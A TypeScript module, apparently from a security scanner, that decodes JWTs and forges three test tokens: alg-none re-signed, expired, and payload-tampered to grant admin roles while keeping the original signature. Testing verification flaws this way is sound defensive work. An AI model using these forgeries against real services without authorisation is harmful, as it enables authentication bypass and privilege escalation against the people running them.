/**
 * Just enough JWT to forge the three attack tokens and to read a real one's claims.
 *
 * No verification and no real signing — the point of these tokens is that they are *wrong*, and a
 * target that accepts one is the finding. Base64url is written by hand because this package runs in
 * a browser bundle too, where `Buffer` is not there.
 */

function base64UrlEncode(text: string): string {
  const bytes = new TextEncoder().encode(text);
  let binary = "";
  for (const byte of bytes) binary += String.fromCharCode(byte);
  return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

export function base64UrlDecode(segment: string): string {
  const padded = segment
    .replace(/-/g, "+")
    .replace(/_/g, "/")
    .padEnd(Math.ceil(segment.length / 4) * 4, "=");
  try {
    const binary = atob(padded);
    const bytes = Uint8Array.from(binary, (character) => character.charCodeAt(0));
    return new TextDecoder().decode(bytes);
  } catch {
    return "";
  }
}

export type JwtParts = { header: Record<string, unknown>; payload: Record<string, unknown>; signature: string };

/** The three parts of a token, or null when it is not a JWT. */
export function decodeJwt(token: string): JwtParts | null {
  const bare = token.replace(/^Bearer\s+/i, "").trim();
  const parts = bare.split(".");
  if (parts.length !== 3) return null;
  const header = safeObject(base64UrlDecode(parts[0]));
  const payload = safeObject(base64UrlDecode(parts[1]));
  if (!header || !payload) return null;
  return { header, payload, signature: parts[2] };
}

function safeObject(text: string): Record<string, unknown> | null {
  try {
    const value: unknown = JSON.parse(text);
    return value && typeof value === "object" && !Array.isArray(value) ? (value as Record<string, unknown>) : null;
  } catch {
    return null;
  }
}

const encode = (object: unknown) => base64UrlEncode(JSON.stringify(object));

/** The token re-signed with `alg: none` — the classic «the server trusts the header» check. */
export function forgeAlgNone(token: string): string | null {
  const decoded = decodeJwt(token);
  if (!decoded) return null;
  return `${encode({ ...decoded.header, alg: "none" })}.${encode(decoded.payload)}.`;
}

/** The same claims with `exp` in the past. Kept with its original algorithm and signature, so a
 * target that checks expiry but not the signature is caught distinctly from an alg-none one. */
export function forgeExpired(token: string): string | null {
  const decoded = decodeJwt(token);
  if (!decoded) return null;
  const payload = { ...decoded.payload, exp: Math.floor(Date.now() / 1000) - 3600 };
  return `${encode(decoded.header)}.${encode(payload)}.${decoded.signature}`;
}

/** The payload tampered — `role: admin`, `admin: true` — with the original signature left in place.
 * A target that does not verify the signature serves the escalated identity. */
export function forgeTampered(token: string): string | null {
  const decoded = decodeJwt(token);
  if (!decoded) return null;
  const payload = { ...decoded.payload, role: "admin", admin: true, isAdmin: true };
  return `${encode(decoded.header)}.${encode(payload)}.${decoded.signature}`;
}
